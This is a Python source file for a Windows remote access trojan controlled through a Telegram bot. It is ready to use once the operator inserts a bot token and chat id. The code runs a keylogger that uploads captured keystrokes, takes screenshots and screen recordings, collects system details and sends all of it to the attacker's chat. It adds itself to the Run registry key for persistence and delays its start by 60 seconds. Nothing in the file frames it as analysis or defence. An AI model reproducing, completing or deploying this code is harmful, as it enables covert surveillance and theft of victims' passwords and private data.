import cv2
import numpy as np
import pyautogui
import telebot 
import threading 
import platform
import pyttsx3
from PIL import ImageGrab
import tempfile
import os
from pynput import keyboard
import winreg
import sys
import time
time.sleep(60)
token = ''  #<<<<<<<<<--------INSERT YOUR BOT TOKEN HERE<<<<<<<<<<<----------
chat_id =   #<<<<<<<<<--------INSERT YOUR CHAT ID HERE<<<<<<<<<<<<<-----------
LOG_FILE = "keylog.txt"
MAX_SIZE_MB = 1 / 1024
bot = telebot.TeleBot(token)
def add_to_startup(app_name="rat"):
    
    file_path = os.path.abspath(sys.argv[0])

    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{file_path}"')
            return True
    except Exception as e:
        return False
def screen_record(duration_seconds, output_file="screen_record.avi", fps=20):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(output_file, fourcc, fps, screen_size)
    start_time = time.time()
    while True:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)
        if (time.time() - start_time) > duration_seconds:
            break
    out.release()
    cv2.destroyAllWindows()
def keylogger():
    def file_size_exceeds_limit(filepath, max_size_mb):
        if os.path.exists(filepath):
            size_bytes = os.path.getsize(filepath)
            size_mb = size_bytes / (1024 * 1024) 
            return size_mb >= max_size_mb
        return False

    def handle_file_limit_reached():
        try:
            with open(LOG_FILE,'rb') as f:
                bot.send_document(chat_id,document=f)
                open(LOG_FILE, "w").close()
        except Exception as e:
            bot.send_message(chat_id,text=f'An error occured {e}')

    def on_press(key):
        if file_size_exceeds_limit(LOG_FILE, MAX_SIZE_MB):
            handle_file_limit_reached()
        try:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(key.char)
        except AttributeError:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f'[{key.name}]')
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def startup_message():
    try:
        bot.send_message(chat_id, "Telegram RAT started and running.")
    except Exception:
        pass

@bot.message_handler(commands=['sysinfo'])
def sysinfo(message):
    info = (
        f"PLATFORM ::: {platform.platform()}\n"
        f"ANDROID VERSION ::: {platform.android_ver()}\n"
        f"ARCHITECTURE ::: {platform.architecture()}()\n"
        f"IOS VERSION ::: {platform.ios_ver()}\n"
        f"LIBC VERSION ::: {platform.libc_ver()}\n"
        f"MAC OS VERSION ::: {platform.mac_ver()}\n"
        f"NETWORK NODE NAME ::: {platform.node()}\n"
        f"MACHINE ::: {platform.machine()}\n"
        f"PROCESSOR ::: {platform.processor()}\n"
        f"PYTHON BRANCH ::: {platform.python_branch()}\n"
        f"PYTHON BUILD ::: {platform.python_build()}\n"
        f"PYTHON COMPILER ::: {platform.python_compiler()}\n"
        f"PYTHON IMPLEMENTATION ::: {platform.python_implementation()}\n"
        f"PYTHON REVISION ::: {platform.python_revision()}\n"
        f"PYTHON VERSION ::: {platform.python_version()}\n"
        f"RELEASE VERSION ::: {platform.release()}\n"
        f"SYSTEM ::: {platform.system()}\n"
        f"UNAME ::: {platform.uname()}\n"
        f"WINDOWS32 EDITION ::: {platform.win32_edition()}\n"
        f"WIN32 IS IOT ::: {platform.win32_is_iot()}\n"
        f"VERSION ::: {platform.version()}\n"
    )
    try:
        bot.send_message(chat_id,info)
    except Exception as w:
        bot.send_message(chat_id,f"ERROR OCCURED {w}")

@bot.message_handler(commands=['record'])
def record(message):
    time = message.text[len('/record '):].strip()
    if not time:
        bot.send_message(chat_id, "Usage: /record <duration in seconds>")
    elif not time.isdigit() or int(time) <= 0:
        bot.send_message(chat_id, "Please provide a valid duration in seconds. send it as a whole number.")
    elif int(time) >= 300:
        bot.send_message(chat_id, "Duration too long.It is recommended to keep it under 5 minutes.") #You can change this limit as per your requirement :) be careful telegram wont send files more than 2 GB!
    else:
        try:
            screen_record(int(time))
            with open("screen_record.avi", 'rb') as video:
                bot.send_video(chat_id, video)
            os.remove("screen_record.avi")
        except Exception as e:
            bot.send_message(chat_id, f"Error: {str(e)}")     

@bot.message_handler(commands=['start','help'])
def print(message):
    commands = (
    "1)/sysinfo - [provides you with the system information]\n"
    "2)/speech - [make the computer speak]\n"
    "3)/screenshot - [takes a screenshot of the computer screen.]\n"
    "4)/fetch - [provides you with the keylog file. NOTE:the keylogger files is automatically uploaded once the file reaches 1KB]\n"
    "5)/startup - [add the rat to starup so it persists even after reboot]\n"
    "6)/record - [record the screen for a specified duration in seconds]\n"
    )
    bot.send_message(chat_id,f"COMMANDS \n{commands}")

@bot.message_handler(commands=['speech'])
def speech(message):
    try:
        content = message.text.replace('/speech','').strip()
        if content:
            pyttsx3.speak(content)
            bot.send_message(chat_id,'successfully said')
        else:
            bot.send_message(chat_id,'USE LIKE THIS /speech [what you want me to say]')
    except Exception as e:
        bot.send_message(chat_id,f'error:{str(e)}')

@bot.message_handler(commands=['screenshot'])
def capture(message):
    count = 0
    status = message.text[len('/screenshot '):].strip()
    while count < int(status):        
        count += 1
        try:
                    screenshot = ImageGrab.grab()
                    with tempfile.NamedTemporaryFile(delete=False,suffix='.png') as tmp:
                        screenshot.save(tmp.name)
                        tmp_path = tmp.name
                    with open(tmp_path,'rb') as photo:
                        bot.send_photo(chat_id,photo)
                        time.sleep(0.25)
                        os.remove(tmp_path)
        except Exception as e:
                    bot.send_message(chat_id,f"ERROR:{e}")
    

@bot.message_handler(commands=['fetch'])
def send_key_log_file(message):
    try:
        with open(LOG_FILE,'rb') as f:
            bot.send_document(chat_id,document=f)
    except Exception as e:
        bot.send_message(chat_id,f'AN ERROR OCCURED:::{e}')

@bot.message_handler(commands=['startup'])
def persistant(message):
    if add_to_startup():
        bot.send_message(chat_id,f"Added successfully [0_0]")
    else:
        bot.send_messgae(chat_id,f'failed to add in startup.')
if __name__ == '__main__':
    threading.Thread(target=startup_message).start()
    keylogger_thread = threading.Thread(target=keylogger)
    keylogger_thread.start()
    bot.polling()


